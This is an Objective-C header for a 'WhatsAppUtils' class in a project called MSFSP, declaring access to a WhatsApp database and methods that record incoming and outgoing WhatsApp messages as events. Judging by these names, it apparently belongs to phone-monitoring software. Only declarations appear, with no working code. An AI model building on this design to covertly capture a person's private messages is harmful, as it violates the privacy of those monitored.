/**
 - Project name :  MSFSP
 - Class name   :  WhatsAppUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  28/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import <Foundation/Foundation.h>

@class FMDatabase;

@interface WhatsAppUtils : NSObject {
@private
	FMDatabase		*mWhatsAppDB;
	NSDictionary	*mAccountInfo;
}


@property(nonatomic,retain) NSDictionary *mAccountInfo;


					 
- (NSDictionary *) accountInfo:(NSString *) aUserID 
					  userName:(NSString *) aUserName;

- (id) incomingMessageParts:(id) aArg;  

- (void) createIncomingWhatsAppEvent:(id) aIncomingEvent;

- (void) createOutgoingWhatsAppEvent:(id) aOutGoingEvent; 
						 
@end
